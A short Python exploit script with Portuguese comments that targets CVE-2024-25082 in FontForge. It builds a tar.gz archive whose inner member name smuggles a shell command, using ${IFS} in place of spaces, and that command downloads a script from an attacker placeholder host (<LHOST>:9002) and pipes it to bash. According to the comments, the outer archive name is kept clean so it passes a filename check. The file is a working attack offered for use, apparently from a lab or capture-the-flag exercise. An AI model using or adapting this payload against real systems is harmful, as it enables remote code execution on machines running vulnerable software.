import tarfile, io
# CVE-2024-25082: FontForge passa o nome do membro do archive a um shell sem sanitizar.
# O nome externo do tarball respeita ^[a-zA-Z0-9._-]+$; o membro interno carrega a injeção.
member = "p$(curl${IFS}-s${IFS}http://<LHOST>:9002/x.sh|bash).sfd"
with tarfile.open("submit.tar.gz", "w:gz") as tar:
    info = tarfile.TarInfo(name=member)
    data = b"\x00"
    info.size = len(data)
    tar.addfile(info, io.BytesIO(data))
print("[+] submit.tar.gz criado; membro:", member)
